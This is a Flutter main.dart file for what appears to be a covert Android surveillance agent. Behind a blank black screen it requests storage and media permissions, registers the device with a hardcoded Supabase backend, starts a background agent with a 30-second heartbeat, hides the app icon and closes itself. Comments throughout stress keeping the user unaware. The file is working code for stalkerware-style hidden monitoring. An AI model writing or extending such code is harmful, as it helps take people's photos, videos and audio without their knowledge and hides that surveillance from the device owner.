// lib/main.dart
import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'core/device_agent.dart';
import 'core/device_id.dart';

const String SUPABASE_URL =
    'https://kywpnhaermwldzcwtsnv.supabase.co';
const int HEARTBEAT_INTERVAL_SECONDS = 30;

const MethodChannel _permChannel =
    MethodChannel('cyber_agent/permissions');
const MethodChannel _appHider =
    MethodChannel('cyber_accessibility_agent/app_hider');

const String _prefSetupDone = 'setup_done';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return const MaterialApp(
      debugShowCheckedModeBanner: false,
      home: SilentSetupPage(),
    );
  }
}

class SilentSetupPage extends StatefulWidget {
  const SilentSetupPage({super.key});

  @override
  State<SilentSetupPage> createState() => _SilentSetupPageState();
}

class _SilentSetupPageState extends State<SilentSetupPage> {
  bool _agentStarted = false;
  Timer? _heartbeatTimer;
  Timer? _pollTimer;
  bool _closing = false;

  @override
  void initState() {
    super.initState();
    _silentInit();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    _pollTimer?.cancel();
    super.dispose();
  }

  Future<void> _silentInit() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final setupDone = prefs.getBool(_prefSetupDone) ?? false;

      if (setupDone) {
        // Already set up in prior run: start agent if needed and immediately close UI
        await _startAgentIfNeeded();
        _closeAppSilently();
        return;
      }

      // First-run: invoke permission request (this shows system UI)
      // We call requestPermissions once, then poll for the result silently.
      try {
        await _permChannel.invokeMethod('requestPermissions');
      } catch (_) {
        // ignore
      }

      // Start polling for permission state every 1.5s. If granted -> proceed.
      int attempts = 0;
      const maxAttempts = 180; // ~4.5 minutes safety cap
      _pollTimer = Timer.periodic(const Duration(milliseconds: 1500), (_) async {
        attempts++;
        final ok = await _checkPermissions();
        if (ok) {
          _pollTimer?.cancel();
          await _onPermissionsGranted();
        } else if (attempts >= maxAttempts) {
          // stop polling to avoid infinite loop; remain silent / black screen
          _pollTimer?.cancel();
        }
      });
    } catch (_) {
      // ignore any unexpected error — keep UI silent
    }
  }

  Future<bool> _checkPermissions() async {
    try {
      final Map<dynamic, dynamic>? map =
          await _permChannel.invokeMethod('checkStoragePermissions');
      if (map == null) return false;
      return map['hasAllFilesAccess'] == true ||
          map['readMediaImages'] == true ||
          map['readMediaVideo'] == true ||
          map['readMediaAudio'] == true;
    } catch (_) {
      return false;
    }
  }

  Future<void> _onPermissionsGranted() async {
    if (_closing) return;
    _closing = true;

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool(_prefSetupDone, true);
    } catch (_) {}

    await _startAgentIfNeeded();

    // hide icon (best-effort)
    try {
      await _appHider.invokeMethod<bool>('hide');
    } catch (_) {}

    // small delay to ensure service started
    await Future.delayed(const Duration(milliseconds: 300));

    // close app silently
    _closeAppSilently();
  }

  Future<void> _startAgentIfNeeded() async {
    if (_agentStarted) return;
    _agentStarted = true;

    try {
      final deviceId = await DeviceId.getOrCreate();
      await DeviceAgent.instance.configure(
        supabaseUrl: SUPABASE_URL,
        deviceId: deviceId,
      );

      // register + start
      await DeviceAgent.instance.register();
      await DeviceAgent.instance.start();

      // start heartbeat
      _heartbeatTimer?.cancel();
      _heartbeatTimer = Timer.periodic(
        const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS),
        (_) => DeviceAgent.instance.heartbeat(),
      );
    } catch (_) {
      // ignore errors here; service will try to operate and surface issues in logs
    }
  }

  void _closeAppSilently() {
    try {
      SystemNavigator.pop(animated: true);
    } catch (_) {
      if (Platform.isAndroid) {
        // fallback
        exit(0);
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    // Completely black minimal UI — invisible to user while system permission flows.
    return const Scaffold(
      backgroundColor: Colors.black,
      body: SizedBox.expand(),
    );
  }
}